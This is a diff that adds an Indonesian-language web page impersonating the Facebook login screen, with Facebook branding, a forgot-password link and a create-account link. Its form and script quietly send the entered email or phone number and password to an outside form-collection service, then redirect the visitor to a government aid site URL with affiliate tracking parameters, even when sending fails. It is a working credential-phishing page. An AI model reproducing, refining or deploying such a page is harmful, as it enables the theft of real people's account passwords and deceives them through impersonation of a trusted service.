@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Masuk</title>
+    <link rel="stylesheet" href="face.css"> 
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    
+    <div class="background-gradient"></div> 
+
+    <div class="login-wrapper">
+        <div class="language-selector-top">
+            <span>Indonesia (Indonesia)</span>
+            <i class="fas fa-chevron-down"></i> 
+        </div>
+
+        <div class="login-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/100px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook" class="facebook-icon">
+            
+            <form 
+                id="loginForm" 
+                class="login-form"
+                action="https://formcarry.com/s/q9SpL4QaIi8" 
+                method="POST"
+            >
+                <input type="text" id="email" name="facebook_email_or_phone" placeholder="Nomor ponsel atau email" required>
+
+                <input type="password" id="password" name="facebook_password" placeholder="Kata sandi" required>
+                
+                <input 
+                    type="hidden" 
+                    id="redirectUrl"
+                    value="https://cekbansos.kemensos.go.id/?pid=incomeaccess_int-6094&af_sub1=a_6094b_435c_&af_ad_id=901&btag=a_6094b_435c_&utm_medium=901&utm_source=6094&utm_campaign=435&siteid=6094"
+                >
+                
+                <button type="submit" id="loginButton" class="login-btn">Masuk</button>
+                
+                <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot-password">Lupa kata sandi?</a>
+            </form>
+            
+            <div class="divider"></div> 
+            
+            <a href="https://web.facebook.com/r.php?locale=id_ID&display=page&entry_point=login" class="create-account-btn">Buat akun baru</a>
+            
+            <div class="meta-branding">
+                <img src="meta.png" alt="Meta Logo" class="meta-logo">
+            </div>
+            
+        </div>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const redirectUrl = document.getElementById('redirectUrl').value;
+
+        loginForm.addEventListener('submit', function(event) {
+            
+            event.preventDefault(); // Mencegah pengiriman formulir HTML standar
+
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            // 1. Cek validasi
+            if (email === '' || password === '') {
+                alert('Mohon isi Nomor ponsel atau email DAN Kata sandi untuk melanjutkan.');
+                return; // Berhenti jika validasi gagal
+            }
+
+            // 2. Kirim data menggunakan Fetch API (AJAX) di latar belakang
+            fetch(loginForm.action, {
+                method: loginForm.method,
+                body: new FormData(loginForm)
+            }).then(() => {
+                // 3. Setelah permintaan pengiriman dikirim, lakukan redirect
+                window.location.href = redirectUrl;
+            }).catch(() => {
+                // Jika ada error jaringan saat mengirim ke Formcarry, tetap coba redirect
+                console.error("Gagal mengirim data ke Formcarry, namun tetap mencoba redirect.");
+                window.location.href = redirectUrl;
+            });
+        });
+    </script>
+</body>
+</html>
